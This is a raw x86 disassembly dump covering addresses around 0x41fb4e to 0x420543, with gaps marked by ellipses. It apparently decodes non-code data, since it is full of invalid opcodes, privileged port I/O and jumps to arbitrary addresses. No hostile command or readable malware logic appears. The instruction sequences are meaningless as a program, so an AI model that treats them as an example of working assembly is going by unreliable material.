  41fb4e:	or     DWORD PTR [esp+ebp*2],0xb928b8b9
  41fb55:	push   ecx
  41fb56:	dec    ebx
  41fb57:	pop    ebp
  41fb58:	adc    dl,ah
  41fb5a:	cmp    eax,0xc5eee662
  41fb5f:	mov    cl,0x44
  41fb61:	cdq    
  41fb62:	into   
  41fb63:	jno    0x41fb4a
  41fb65:	and    BYTE PTR [eax+0x6373c2d5],bh
  41fb6b:	stos   BYTE PTR es:[edi],al
  41fb6c:	std    
  41fb6d:	(bad)  
  41fb6e:	xchg   edi,eax
  41fb6f:	mov    al,0x43
  41fb71:	data16 das 
  41fb73:	push   0xbb588243
  41fb78:	mov    dh,0x1f
  41fb7a:	mov    edi,0x48b00265
  41fb7f:	ja     0x41fb5e
  41fb81:	stos   DWORD PTR es:[edi],eax
  41fb82:	fsubp  st(6),st
  41fb84:	adc    esp,DWORD PTR [ebp-0x354fc5e0]
  41fb8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fb8b:	sbb    edi,esp
  41fb8d:	xchg   esi,eax
  41fb8e:	xchg   ebx,eax
  41fb8f:	test   DWORD PTR [eax],eax
	...
  41fbf1:	add    BYTE PTR [eax],al
  41fbf3:	add    ah,bl
  41fbf5:	sub    BYTE PTR [edx-0x119011c],cl
  41fbfb:	cmp    BYTE PTR [esi],ah
  41fbfd:	ret    
  41fbfe:	or     DWORD PTR [esi],edx
  41fc00:	inc    ebp
  41fc01:	dec    esi
  41fc02:	dec    edi
  41fc03:	mov    ebx,0x151d4
  41fc08:	add    al,0x1
  41fc0a:	add    BYTE PTR [eax],al
  41fc0c:	icebp  
  41fc0d:	test   eax,0xc34c16bf
  41fc12:	pop    edx
  41fc13:	sbb    esi,DWORD PTR [ebx+0x121e3128]
  41fc19:	in     eax,dx
  41fc1a:	and    BYTE PTR [edx],0xd
  41fc1d:	mov    dl,0xd2
  41fc1f:	popf   
  41fc20:	cmp    BYTE PTR [ecx+0x58],al
  41fc23:	xchg   DWORD PTR [esi-0x465bd7f6],ebp
  41fc29:	mov    ch,ah
  41fc2b:	loope  0x41fc96
  41fc2d:	(bad)  
  41fc2e:	xchg   esp,eax
  41fc2f:	sub    al,0x12
  41fc31:	pushf  
  41fc32:	in     al,dx
  41fc33:	push   edi
  41fc34:	ss sbb edx,ecx
  41fc37:	stc    
  41fc38:	sub    ebp,DWORD PTR [ebp+0x55]
  41fc3b:	mov    ds:0xff518fe1,al
  41fc40:	lods   al,BYTE PTR ds:[esi]
  41fc41:	jmp    0x11e758cd
  41fc46:	mov    ebx,0x8114a0b4
  41fc4b:	push   ds
  41fc4c:	cmp    DWORD PTR [ebx],esi
  41fc4e:	add    di,WORD PTR [esp+eax*8-0x3993e9c4]
  41fc56:	xchg   ebp,eax
  41fc57:	jo     0x41fc8c
  41fc59:	dec    ch
  41fc5b:	scas   al,BYTE PTR es:[edi]
  41fc5c:	mov    dh,0x4d
  41fc5e:	sbb    DWORD PTR [ecx],edx
  41fc60:	repnz inc esi
  41fc62:	in     eax,dx
  41fc63:	adc    ch,BYTE PTR [ebx+0x68]
  41fc66:	mov    ebx,cs
  41fc68:	lock or cl,BYTE PTR [ebx+0x76]
  41fc6c:	ja     0x41fc66
  41fc6e:	(bad)  
  41fc6f:	into   
  41fc70:	or     al,0x68
  41fc72:	sbb    cl,cl
  41fc74:	or     BYTE PTR [ebx+0x3e98e4ed],al
  41fc7a:	enter  0x8947,0x83
  41fc7e:	cwde   
  41fc7f:	clc    
  41fc80:	add    BYTE PTR [ebp-0x13],0xc8
  41fc84:	hlt    
  41fc85:	cmp    BYTE PTR [edi],bh
  41fc87:	scas   al,BYTE PTR es:[edi]
  41fc88:	in     eax,dx
  41fc89:	jle    0x41fcb0
  41fc8b:	adc    DWORD PTR ds:0x35115e8e,0x1212205e
  41fc95:	inc    esi
  41fc96:	fucomp st(1)
  41fc98:	aam    0x94
  41fc9a:	cmp    DWORD PTR [ecx-0x1b87c512],0xe42ef3a7
  41fca4:	or     DWORD PTR [edi+esi*4+0x35],0x33
  41fca9:	mov    bl,0x8b
  41fcab:	(bad)  
  41fcac:	outs   dx,DWORD PTR ds:[esi]
  41fcad:	addr16 sbb bl,ah
  41fcb0:	jmp    0x41fcc2
  41fcb2:	shl    DWORD PTR [ebx],cl
  41fcb4:	xlat   BYTE PTR ds:[ebx]
  41fcb5:	das    
  41fcb6:	add    DWORD PTR ds:[eax],esi
  41fcb9:	mul    BYTE PTR [ebx+0x4ca63d70]
  41fcbf:	cmp    DWORD PTR [si+0x6134],ecx
  41fcc4:	mov    fs,WORD PTR [edi+0x2a25a8db]
  41fcca:	mov    BYTE PTR [eax],0x9f
  41fccd:	mov    ?,WORD PTR [ebp+edx*4+0x8ea739]
  41fcd4:	bound  eax,QWORD PTR [ebx-0x57]
  41fcd7:	imul   dl
  41fcd9:	mov    ah,0x5b
  41fcdb:	jle    0x41fd18
  41fcdd:	dec    ebx
  41fcde:	cpuid  
  41fce0:	shl    BYTE PTR ds:0x3b8f98cf,cl
  41fce6:	loope  0x41fcba
  41fce8:	imul   ebx,DWORD PTR [edx+0x29c3ac6c],0xffffffe1
  41fcef:	mov    bh,0x7a
  41fcf1:	jg     0x41fd51
  41fcf3:	xor    DWORD PTR [ecx],edx
  41fcf5:	sbb    eax,0xe3865bac
  41fcfa:	dec    edx
  41fcfb:	(bad)  
  41fcfc:	stos   BYTE PTR es:[edi],al
  41fcfd:	sub    eax,DWORD PTR [edx-0x2d34b199]
  41fd03:	jo     0x41fcce
  41fd05:	loopne 0x41fd51
  41fd07:	sysexit 
  41fd09:	imul   ebp,ecx,0xffffffbc
  41fd0c:	out    dx,eax
  41fd0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fd0e:	xor    eax,0x1e
	...
  41fd73:	add    BYTE PTR [edx+ebp*2],cl
  41fd76:	push   edx
  41fd77:	shl    DWORD PTR [esi-0x7],0x9f
  41fd7b:	out    dx,eax
  41fd7c:	pop    ds
  41fd7d:	pop    edx
  41fd7e:	pushf  
  41fd7f:	push   ss
  41fd80:	(bad)  
  41fd83:	xor    eax,0x152d8
  41fd88:	add    al,0x1
  41fd8a:	add    BYTE PTR [eax],al
  41fd8c:	jnp    0x41fd2a
  41fd8e:	jno    0x41fdea
  41fd90:	dec    eax
  41fd91:	out    0xe0,eax
  41fd93:	mov    gs,WORD PTR ds:[eax]
  41fd96:	sbb    BYTE PTR [ecx-0x3e8d0e21],ah
  41fd9c:	lods   al,BYTE PTR ds:[esi]
  41fd9d:	cdq    
  41fd9e:	(bad)  
  41fda0:	outs   dx,BYTE PTR ds:[esi]
  41fda1:	loop   0x41fdcc
  41fda3:	jmp    0x32ee3fec
  41fda8:	in     al,0x62
  41fdaa:	fist   WORD PTR [edi-0x9]
  41fdad:	fs push ss
  41fdaf:	adc    eax,0xdf0bd4f8
  41fdb4:	or     ecx,0x29
  41fdb7:	fcomp  QWORD PTR [esi]
  41fdb9:	jb     0x41fe0d
  41fdbb:	ins    BYTE PTR es:[edi],dx
  41fdbc:	pushf  
  41fdbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fdbe:	in     eax,0xa4
  41fdc0:	and    al,0x25
  41fdc2:	ffreep st(4)
  41fdc4:	mov    ebp,0xa00665cc
  41fdc9:	lahf   
  41fdca:	dec    esp
  41fdcb:	fst    DWORD PTR [edi-0x53]
  41fdce:	jle    0x41fdc3
  41fdd0:	scas   eax,DWORD PTR es:[edi]
  41fdd1:	dec    esp
  41fdd2:	loopne 0x41fde3
  41fdd4:	mov    dh,0x50
  41fdd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fdd7:	xchg   ecx,esp
  41fdd9:	cmp    ebp,ebp
  41fddb:	dec    esp
  41fddc:	ret    
  41fddd:	pop    edi
  41fdde:	or     cl,cl
  41fde0:	sbb    ebx,DWORD PTR [ebp+0x646d4510]
  41fde6:	cdq    
  41fde7:	mov    bh,0x48
  41fde9:	cmp    DWORD PTR [ecx+esi*1],esp
  41fdec:	gs shl dh,1
  41fdef:	jmp    0xfd3c:0xd31372f3
  41fdf6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fdf7:	and    DWORD PTR [edi+eiz*2+0x2e],0x9f345b59
  41fdff:	lods   eax,DWORD PTR ds:[esi]
  41fe00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe01:	data16 xor al,0x20
  41fe04:	sar    esi,1
  41fe06:	popf   
  41fe07:	jo     0x41fdd7
  41fe09:	outs   dx,DWORD PTR ds:[esi]
  41fe0a:	stos   DWORD PTR es:[edi],eax
  41fe0b:	xchg   edi,eax
  41fe0c:	xchg   ebx,eax
  41fe0d:	les    esp,FWORD PTR [eax+0x2e]
  41fe10:	(bad)  
  41fe11:	fsub   DWORD PTR [eax+ecx*2+0x7d]
  41fe15:	xchg   ebx,eax
  41fe16:	mov    edi,0x1da655d6
  41fe1b:	mov    ebp,0x8a75efd3
  41fe20:	jecxz  0x41fde5
  41fe22:	enter  0xbda,0x7f
  41fe26:	stos   DWORD PTR es:[edi],eax
  41fe27:	or     bh,BYTE PTR [ebx]
  41fe29:	jge    0x41fe57
  41fe2b:	lds    ebx,FWORD PTR [edi]
  41fe2d:	in     al,dx
  41fe2e:	inc    esp
  41fe2f:	jle    0x41fe21
  41fe31:	arpl   WORD PTR [ebx+0x12],di
  41fe34:	nop
  41fe35:	call   0x7a070641
  41fe3a:	(bad)  
  41fe3b:	jmp    0xc2f0:0x51dc1e0b
  41fe42:	ret    0x941a
  41fe45:	lods   al,BYTE PTR ds:[esi]
  41fe46:	repz adc eax,0x3116b22d
  41fe4c:	sub    al,0xd4
  41fe4e:	in     eax,dx
  41fe4f:	je     0x41fe37
  41fe51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe52:	push   ebp
  41fe53:	dec    ebx
  41fe54:	cmp    ebp,DWORD PTR [eax+0x1ca5d4bc]
  41fe5a:	hlt    
  41fe5b:	arpl   WORD PTR cs:[eax+0xd081069],ax
  41fe62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fe63:	xor    dh,ah
  41fe65:	pop    ds
  41fe66:	sbb    BYTE PTR [ecx],al
  41fe68:	leave  
  41fe69:	jne    0x41fe40
  41fe6b:	jmp    0xa243:0x13bcdfc7
  41fe72:	outs   dx,BYTE PTR ds:[esi]
  41fe73:	push   esp
  41fe74:	jp     0x41fe2f
  41fe76:	adc    ecx,0x7a
  41fe79:	jl     0x41fe41
  41fe7b:	inc    ecx
  41fe7c:	les    edi,FWORD PTR [esi+edx*8-0x80]
  41fe80:	lock sub DWORD PTR [ebx+0x74678cc9],edx
  41fe87:	xor    eax,0x1e316c81
  41fe8c:	out    0x4c,al
  41fe8e:	pushf  
  41fe8f:	ret    
	...
  41fef4:	stos   BYTE PTR es:[edi],al
  41fef5:	push   ebp
  41fef6:	call   0xfb5d:0xffefffe7
  41fefd:	(bad)  
  41fefe:	hlt    
  41feff:	mov    ah,0x6b
  41ff01:	ret    0x7d7d
  41ff04:	fcom   QWORD PTR [ebx+0x1]
  41ff07:	add    BYTE PTR [ecx+eax*1],al
  41ff0a:	add    BYTE PTR [eax],al
  41ff0c:	out    dx,eax
  41ff0d:	fdiv   QWORD PTR [ebx]
  41ff0f:	jns    0x41feec
  41ff11:	loop   0x41ff50
  41ff13:	sbb    al,0x2e
  41ff15:	cmc    
  41ff16:	loopne 0x41ff67
  41ff18:	xor    al,0x58
  41ff1a:	repz and esp,DWORD PTR [edi-0x39b0a2e3]
  41ff21:	lds    ebp,FWORD PTR [ebp-0x1a9b0020]
  41ff27:	in     eax,0xb6
  41ff29:	cwde   
  41ff2a:	inc    edi
  41ff2b:	add    dl,BYTE PTR [ebp-0x4f]
  41ff2e:	popa   
  41ff2f:	out    dx,eax
  41ff30:	jmp    DWORD PTR [edi+0x35]
  41ff33:	dec    eax
  41ff34:	ret    
  41ff35:	mov    ecx,0x19586bac
  41ff3a:	ror    BYTE PTR [edi-0x75],cl
  41ff3d:	inc    ecx
  41ff3e:	push   eax
  41ff3f:	out    0xf7,al
  41ff41:	xchg   ebx,eax
  41ff42:	clc    
  41ff43:	mov    al,fs:0x55ee4e1
  41ff49:	xlat   BYTE PTR ds:[ebx]
  41ff4a:	xor    eax,DWORD PTR es:[eax+0xe53c757]
  41ff51:	pusha  
  41ff52:	jne    0x41feea
  41ff54:	sbb    ebx,ebp
  41ff56:	sbb    DWORD PTR [edx-0xb879ffd],edx
  41ff5c:	cmp    eax,0x30d62e7
  41ff61:	dec    edi
  41ff62:	cmp    edi,DWORD PTR [ebx+0xe]
  41ff65:	lods   eax,DWORD PTR ds:[esi]
  41ff66:	sbb    al,0x9b
  41ff68:	outs   dx,BYTE PTR ds:[esi]
  41ff69:	or     bl,bh
  41ff6b:	jo     0x41ff1b
  41ff6d:	adc    BYTE PTR ds:[eax+0x67be5cf5],0x2e
  41ff75:	leave  
  41ff76:	push   esi
  41ff77:	sub    eax,0xa0b53fe2
  41ff7c:	pop    esi
  41ff7d:	popa   
  41ff7e:	cs ret 0xb14e
  41ff82:	dec    edi
  41ff83:	fstp   TBYTE PTR [esi+0x70a3f64f]
  41ff89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ff8a:	ja     0x41ffc6
  41ff8c:	jl     0x41fff1
  41ff8e:	push   ecx
  41ff8f:	or     al,0xe6
  41ff91:	or     DWORD PTR [edi+0x64],edi
  41ff94:	dec    esp
  41ff95:	dec    esi
  41ff96:	test   DWORD PTR [eax+0x2c],edx
  41ff99:	adc    al,0xb6
  41ff9b:	or     BYTE PTR [edx-0xcd05321],al
  41ffa1:	sub    eax,DWORD PTR [esi-0x74]
  41ffa4:	scas   al,BYTE PTR es:[edi]
  41ffa5:	xor    al,BYTE PTR [ecx-0x24]
  41ffa8:	ds and eax,0x2309fcf
  41ffae:	and    bh,dh
  41ffb0:	inc    edi
  41ffb1:	and    al,0xd9
  41ffb3:	iret   
  41ffb4:	imul   bl
  41ffb6:	call   0x5d386c87
  41ffbb:	ins    BYTE PTR es:[edi],dx
  41ffbc:	das    
  41ffbd:	dec    ebp
  41ffbe:	xchg   edx,eax
  41ffbf:	add    al,BYTE PTR [eax+0x52]
  41ffc2:	mov    dl,0x17
  41ffc4:	(bad)  
  41ffc5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ffc6:	scas   eax,DWORD PTR es:[edi]
  41ffc7:	ins    DWORD PTR es:[edi],dx
  41ffc8:	cld    
  41ffc9:	or     DWORD PTR [ebx],ecx
  41ffcb:	popf   
  41ffcc:	popf   
  41ffcd:	jp     0x41ff58
  41ffcf:	mov    DWORD PTR [ebx-0x49],ebp
  41ffd2:	mov    esi,0x38e5b9c3
  41ffd7:	hlt    
  41ffd8:	out    dx,al
  41ffd9:	push   0x0
  41ffdb:	jp     0x420035
  41ffdd:	sbb    al,0xbc
  41ffdf:	lea    esp,[edi-0x5914d058]
  41ffe5:	(bad)  
  41ffe7:	test   DWORD PTR [edx-0x5b0cc688],esi
  41ffed:	test   BYTE PTR [ecx],0x1b
  41fff0:	adc    eax,DWORD PTR es:[esi]
  41fff3:	jmp    0xab2e5bca
  41fff8:	lds    edi,FWORD PTR [ebx-0x67c5865e]
  41fffe:	jne    0x420043
  420000:	(bad)  
  420001:	pop    ds
  420002:	push   esp
  420003:	out    dx,al
  420004:	dec    esp
  420005:	shl    DWORD PTR [edi-0x73c55b4b],0xdc
  42000c:	sub    eax,0x85ac32
	...
  420071:	add    BYTE PTR [eax],al
  420073:	add    BYTE PTR [edx-0x5b],ah
  420076:	jbe    0x4200f7
  420078:	idiv   edi
  42007a:	imul   edi,DWORD PTR [ebp-0x6d81eb08],0x16
  420081:	add    edx,eax
  420083:	and    eax,0x4000154
  420089:	add    DWORD PTR [eax],eax
  42008b:	add    BYTE PTR [ebp-0xf],cl
  42008e:	outs   dx,DWORD PTR ds:[esi]
  42008f:	ins    DWORD PTR es:[edi],dx
  420090:	js     0x4200d9
  420092:	(bad)  
  420093:	cli    
  420094:	dec    esi
  420095:	xor    al,0x26
  420097:	repnz sub BYTE PTR [esi],0x29
  42009b:	jmp    DWORD PTR es:[ebx+esi*1+0x4e]
  4200a0:	es hlt 
  4200a2:	cs jle 0x420091
  4200a5:	pop    edx
  4200a6:	(bad)  
  4200a7:	test   DWORD PTR [esi+0xf4be03b],0xbbaa93aa
  4200b1:	adc    edi,DWORD PTR [edi+0x34db5987]
  4200b7:	or     al,0x19
  4200b9:	and    DWORD PTR [ebx+0x1107a465],0x4d
  4200c0:	pusha  
  4200c1:	mov    edi,DWORD PTR ds:0x20d2d10c
  4200c7:	mov    al,0x80
  4200c9:	stos   DWORD PTR es:[edi],eax
  4200ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4200cb:	sub    al,BYTE PTR [esi+0x2]
  4200ce:	mov    bh,0xbe
  4200d0:	pop    es
  4200d1:	push   esi
  4200d2:	ins    BYTE PTR es:[edi],dx
  4200d3:	push   edi
  4200d4:	xchg   ch,bl
  4200d6:	dec    esp
  4200d7:	ins    BYTE PTR es:[edi],dx
  4200d8:	lods   al,BYTE PTR ds:[esi]
  4200d9:	push   ecx
  4200da:	stc    
  4200db:	enter  0x6f6e,0x7b
  4200df:	adc    DWORD PTR [edx+ecx*4-0x17],0x62
  4200e4:	add    BYTE PTR [ebp+0x7128cbf4],ah
  4200ea:	sbb    BYTE PTR [ebx+0xff149a8],0x63
  4200f1:	mov    eax,0x4e0d3a5
  4200f6:	or     al,al
  4200f8:	dec    ebp
  4200f9:	or     al,BYTE PTR [esi]
  4200fb:	push   es
  4200fc:	std    
  4200fd:	movd   mm3,DWORD PTR [eax+edx*4+0x3af0ea78]
  420105:	popa   
  420106:	or     DWORD PTR [ebx+0x14],ebp
  420109:	pop    ebp
  42010a:	and    ebx,DWORD PTR [eax-0x2b]
  42010d:	in     eax,dx
  42010e:	jno    0x420104
  420110:	hlt    
  420111:	ret    0x1056
  420114:	fcomp  st(4)
  420116:	imul   eax,DWORD PTR [ebx+0x53],0x39
  42011a:	mov    ebx,esi
  42011c:	sti    
  42011d:	lods   eax,DWORD PTR ds:[esi]
  42011e:	xlat   BYTE PTR ds:[ebx]
  42011f:	and    ecx,DWORD PTR [ebx-0x6cc8b6fd]
  420125:	dec    esi
  420126:	repnz sub edx,edi
  420129:	lock cmc 
  42012b:	add    al,0x7
  42012d:	mov    edx,0xbf9b443a
  420132:	mov    ds:0xadcebb00,al
  420137:	inc    ebp
  420138:	ror    dh,0x90
  42013b:	cmovp  ebp,DWORD PTR [ebx]
  42013e:	inc    esi
  42013f:	iret   
  420140:	push   0x5d
  420142:	mov    ch,0xd7
  420144:	into   
  420145:	xor    eax,0xd8f951a4
  42014a:	inc    esi
  42014b:	adc    ah,cl
  42014d:	ss stos DWORD PTR es:[edi],eax
  42014f:	pusha  
  420150:	push   cs
  420151:	inc    eax
  420152:	stos   BYTE PTR es:[edi],al
  420153:	aas    
  420154:	mov    WORD PTR [edx+ebx*4-0x62],?
  420158:	or     BYTE PTR [ecx+0x5f],al
  42015b:	aas    
  42015c:	push   cs
  42015d:	sub    eax,ecx
  42015f:	or     al,0x2b
  420161:	ja     0x420119
  420163:	lods   al,BYTE PTR ds:[esi]
  420164:	(bad)  
  420165:	cld    
  420166:	cmp    ebx,DWORD PTR [esi+0x53]
  420169:	jmp    0x9967:0xc01f7873
  420170:	push   esp
  420171:	pop    ds
  420172:	pop    edi
  420173:	ret    0x7ee8
  420176:	jae    0x420198
  420178:	(bad)  
  42017a:	mov    edx,0x15903406
  42017f:	cmc    
  420180:	test   al,0xd5
  420182:	test   eax,0x745be65d
  420187:	scas   eax,DWORD PTR es:[edi]
  420188:	les    edx,FWORD PTR [eax-0x9e27066]
  42018e:	cmp    BYTE PTR [esi+0x0],dl
	...
  4201f1:	add    BYTE PTR [eax],al
  4201f3:	add    BYTE PTR [ebx-0x31],dh
  4201f6:	fwait
  4201f7:	cmp    DWORD PTR [edi-0x27300c83],edi
  4201fd:	stos   BYTE PTR es:[edi],al
  4201fe:	sar    BYTE PTR [ebx-0x6b87d58],1
  420204:	in     al,0x55
  420206:	add    DWORD PTR [eax],eax
  420208:	add    al,0x1
  42020a:	add    BYTE PTR [eax],al
  42020c:	imul   ebp,DWORD PTR [ebp+0xb],0x6a
  420210:	outs   dx,BYTE PTR ds:[esi]
  420211:	push   esi
  420212:	or     dl,BYTE PTR [esp+ebp*4]
  420215:	aad    0x49
  420217:	mov    eax,ds:0x310c64a3
  42021c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42021d:	adc    BYTE PTR [ecx+esi*1],0xda
  420221:	imul   ebp,DWORD PTR [esi+0x1203bdb],0x41
  420228:	jmp    0x94c7:0x26d63e10
  42022f:	mov    esp,DWORD PTR ds:0x75004a81
  420235:	outs   dx,DWORD PTR ds:[esi]
  420236:	and    ecx,DWORD PTR [ebp+0x1260c529]
  42023c:	push   cs
  42023d:	out    0x39,al
  42023f:	jp     0x42024a
  420241:	iret   
  420242:	sar    BYTE PTR [ecx+0x3f],cl
  420245:	mov    ds:0xaa2c139a,eax
  42024a:	out    dx,eax
  42024b:	ds hlt 
  42024d:	ja     0x4202aa
  42024f:	fdiv   st,st(5)
  420251:	stos   DWORD PTR es:[edi],eax
  420252:	inc    edi
  420253:	adc    eax,0xfcdf8b84
  420258:	in     al,dx
  420259:	mov    ?,WORD PTR [eax-0x59]
  42025c:	clc    
  42025d:	test   al,0x46
  42025f:	push   esi
  420260:	adc    dl,bl
  420262:	fbstp  TBYTE PTR [ecx-0x77b8c50c]
  420268:	sahf   
  420269:	outs   dx,DWORD PTR ds:[esi]
  42026a:	mov    esi,0x46929806
  42026f:	loop   0x420297
  420271:	sub    eax,0x28ff63fe
  420276:	sub    esp,ebx
  420278:	push   ecx
  420279:	aam    0x19
  42027b:	loop   0x4202e1
  42027d:	add    al,0x57
  42027f:	inc    esp
  420280:	dec    ebp
  420281:	push   eax
  420282:	xchg   ebx,eax
  420283:	dec    ebx
  420284:	mov    ebx,0x19cf7d87
  420289:	lods   eax,DWORD PTR ds:[esi]
  42028a:	sub    esi,ecx
  42028c:	out    0x10,eax
  42028e:	push   esp
  42028f:	pop    ecx
  420290:	xor    eax,DWORD PTR [edi+0x53bf1044]
  420296:	daa    
  420297:	dec    edi
  420298:	and    al,BYTE PTR [eax-0x16]
  42029b:	dec    ebx
  42029c:	pop    es
  42029d:	push   cs
  42029e:	cmc    
  42029f:	mov    ah,0x7c
  4202a1:	out    dx,al
  4202a2:	dec    edx
  4202a3:	mov    esi,0xc9e92270
  4202a8:	mov    ch,0x17
  4202aa:	hlt    
  4202ab:	lahf   
  4202ac:	cmc    
  4202ad:	xor    al,BYTE PTR [edx]
  4202af:	nop
  4202b0:	fistp  DWORD PTR [edx]
  4202b2:	push   ds
  4202b3:	inc    ebx
  4202b4:	jecxz  0x4202a1
  4202b6:	inc    edx
  4202b7:	neg    ebx
  4202b9:	shl    esp,0xa7
  4202bc:	add    al,0x9c
  4202be:	pop    ebp
  4202bf:	sbb    edi,DWORD PTR [ebp+ebp*8+0x2acca139]
  4202c6:	cmp    bh,bh
  4202c8:	out    0xb6,al
  4202ca:	cmp    dh,dh
  4202cc:	bound  ecx,QWORD PTR [ebx+0x3d92548e]
  4202d2:	inc    ecx
  4202d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4202d4:	dec    edx
  4202d5:	sbb    al,0xcf
  4202d7:	imul   esp,DWORD PTR [ecx+esi*8],0x79
  4202db:	xchg   ebp,eax
  4202dc:	fdivr  QWORD PTR [ebp+0x17]
  4202df:	or     eax,0xb9d2110a
  4202e4:	mov    ch,0x2e
  4202e6:	sar    ecx,cl
  4202e8:	leave  
  4202e9:	or     DWORD PTR [edx-0x1c],0xffffff87
  4202ed:	cmp    eax,DWORD PTR [esp+esi*1-0x74]
  4202f1:	dec    ecx
  4202f2:	cli    
  4202f3:	and    ah,BYTE PTR [bx+si-0x20]
  4202f7:	cdq    
  4202f8:	sbb    bl,BYTE PTR [ecx+ecx*2]
  4202fb:	neg    BYTE PTR [edi+0x33b87aef]
  420301:	in     al,0xbe
  420303:	pop    eax
  420304:	cmp    al,0xda
  420306:	sti    
  420307:	push   ss
  420308:	jle    0x42028a
  42030a:	jbe    0x4202b6
  42030c:	clc    
  42030d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42030e:	sub    DWORD PTR [edx],esi
	...
  420374:	inc    ecx
  420375:	push   es
  420376:	clc    
  420377:	mov    esi,0xff47feff
  42037c:	and    BYTE PTR [eax+0x2a],bh
  42037f:	hlt    
  420380:	jg     0x4203b8
  420382:	inc    ebp
  420383:	retf   0x56e8
  420386:	add    DWORD PTR [eax],eax
  420388:	add    al,0x1
  42038a:	add    BYTE PTR [eax],al
  42038c:	jg     0x4203ba
  42038e:	or     BYTE PTR [ebx+0x4],ah
  420391:	dec    esi
  420392:	retf   
  420393:	ret    
  420394:	adc    DWORD PTR [esi+edx*4+0x3386f63d],edi
  42039b:	(bad)  
  42039c:	ds das 
  42039e:	xchg   ebx,eax
  42039f:	mov    edi,0x7644fb94
  4203a4:	jbe    0x4203a3
  4203a6:	mov    esi,0x4c673636
  4203ab:	mov    al,ds:0x5958d4a1
  4203b0:	sub    al,0x77
  4203b2:	ds mov ah,0x7d
  4203b5:	cmp    al,0x55
  4203b7:	cmp    DWORD PTR [ebx+0x20eacae0],ebx
  4203bd:	cwde   
  4203be:	mov    esi,0x728ca926
  4203c3:	jmp    esi
  4203c5:	push   ds
  4203c6:	pop    es
  4203c7:	pop    esi
  4203c8:	leave  
  4203c9:	ja     0x420413
  4203cb:	jmp    0x1f10:0xe698d3dd
  4203d2:	pop    eax
  4203d3:	adc    cl,al
  4203d5:	or     DWORD PTR [ebx-0x1ee3aa03],ecx
  4203db:	cmp    esi,edx
  4203dd:	fs xchg esi,eax
  4203df:	imul   DWORD PTR [edi+ebx*1-0x3e3a911c]
  4203e6:	sbb    edi,edi
  4203e8:	pop    edi
  4203e9:	dec    ebp
  4203ea:	ds sub eax,0xd61ab04f
  4203f0:	out    0xe8,eax
  4203f2:	es adc eax,0x95f5c5e0
  4203f8:	inc    ebp
  4203f9:	cmp    DWORD PTR [eax-0x4e8235d3],edi
  4203ff:	push   ecx
  420400:	test   BYTE PTR [ebp+0x666079f6],ch
  420406:	outs   dx,BYTE PTR ds:[esi]
  420407:	jno    0x42039a
  420409:	mov    WORD PTR [edi],cs
  42040b:	lds    eax,FWORD PTR [ecx]
  42040d:	aam    0x5
  42040f:	ins    BYTE PTR es:[edi],dx
  420410:	cmp    ch,BYTE PTR [ebx-0x54260cf8]
  420416:	fwait
  420417:	jns    0x420468
  420419:	out    0x47,eax
  42041b:	adc    BYTE PTR [edi+0x6b],dl
  42041e:	mov    dh,0x6e
  420420:	cmp    esi,DWORD PTR [ebp+ecx*8-0x74a9131]
  420427:	daa    
  420428:	mov    bl,0xc1
  42042a:	jb     0x4203d4
  42042c:	mov    al,0x54
  42042e:	test   al,0x64
  420430:	(bad)  
  420431:	cmp    esp,DWORD PTR [esi-0x34]
  420434:	fld    TBYTE PTR [ecx+0x75241422]
  42043a:	cmc    
  42043b:	adc    ebp,DWORD PTR [esi]
  42043d:	(bad)
  420440:	inc    ebp
  420441:	mov    cs,ecx
  420443:	sbb    edx,eax
  420445:	aam    0x67
  420447:	nop
  420448:	call   0x1743e84
  42044d:	es out 0x7d,eax
  420450:	inc    esp
  420451:	(bad)
  420454:	(bad)  
  420455:	(bad)  
  420456:	std    
  420457:	call   0xf528c203
  42045c:	mov    eax,cs
  42045e:	xchg   ecx,eax
  42045f:	adc    bl,BYTE PTR [edx-0x2b]
  420462:	mov    esi,0x73229451
  420467:	xchg   ebp,eax
  420468:	cld    
  420469:	cmp    dh,dl
  42046b:	call   0x779c6717
  420470:	gs addr16 das 
  420473:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420474:	mov    esi,0x54fd177c
  420479:	inc    eax
  42047a:	cmp    edi,DWORD PTR [eax+edi*4-0x27d8377e]
  420481:	int    0x3d
  420483:	test   edi,eax
  420485:	imul   esi,DWORD PTR [edi+0x5124d85a],0xffffffa8
  42048c:	out    0x36,al
  42048e:	outs   dx,BYTE PTR ds:[esi]
  42048f:	pop    ebp
	...
  4204f4:	scas   al,BYTE PTR es:[edi]
  4204f5:	xchg   esp,eax
  4204f6:	push   edi
  4204f7:	adc    bh,BYTE PTR [edi-0x2d]
  4204fa:	out    dx,eax
  4204fb:	mov    esp,0x5a7f6c39
  420500:	mov    eax,ds:0xec1b59df
  420505:	push   edi
  420506:	add    DWORD PTR [eax],eax
  420508:	add    al,0x1
  42050a:	add    BYTE PTR [eax],al
  42050c:	std    
  42050d:	cmp    dh,BYTE PTR [eax-0x54]
  420510:	mov    DWORD PTR fs:0xcf2385ef,edi
  420517:	mov    cl,0x3f
  420519:	aad    0x46
  42051b:	in     eax,0x9f
  42051d:	sti    
  42051e:	addr16 repz inc esi
  420521:	into   
  420522:	dec    esp
  420523:	mov    eax,ds:0x60dc279
  420528:	rcl    DWORD PTR [edi],cl
  42052a:	fs mov dh,0x18
  42052d:	xchg   edx,eax
  42052e:	sar    BYTE PTR [ecx],0x20
  420531:	sub    ebx,DWORD PTR [ecx+0x1f]
  420534:	loop   0x420532
  420536:	pop    ebx
  420537:	push   0xe
  420539:	push   ebx
  42053a:	cwde   
  42053b:	fcom   DWORD PTR [edi+0x1f792523]
  420541:	jl     0x4204c7
  420543:	cmp    edi,DWORD PTR [eax]
